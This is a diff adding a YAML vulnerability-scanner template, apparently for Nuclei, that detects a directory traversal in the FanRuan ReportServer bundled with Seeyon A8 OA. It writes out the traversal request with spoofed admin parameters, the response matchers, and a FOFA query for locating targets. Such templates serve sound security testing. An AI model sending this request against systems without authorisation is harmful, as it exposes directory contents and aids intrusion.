@@ -1,0 +1,31 @@
+id: seeyon-reportserver-directory-traversal
+
+info:
+  name: 致远 OA 帆软组件 ReportServer 目录遍历
+  author: zan8in
+  severity: high
+  description: |
+    致远 A8 内嵌帆软 /seeyonreport/ReportServer 可列目录，响应 NODES/xmlVersion/releaseVersion，泄露组件版本与路径。
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="致远互联-OA"
+  tags: seeyon,a8,fanruan,lfi,disclosure
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<NODES"
+          - "</NODES>"
+          - "xmlVersion"
+          - "releaseVersion"
+        condition: and
+      - type: status
+        status:
+          - 200
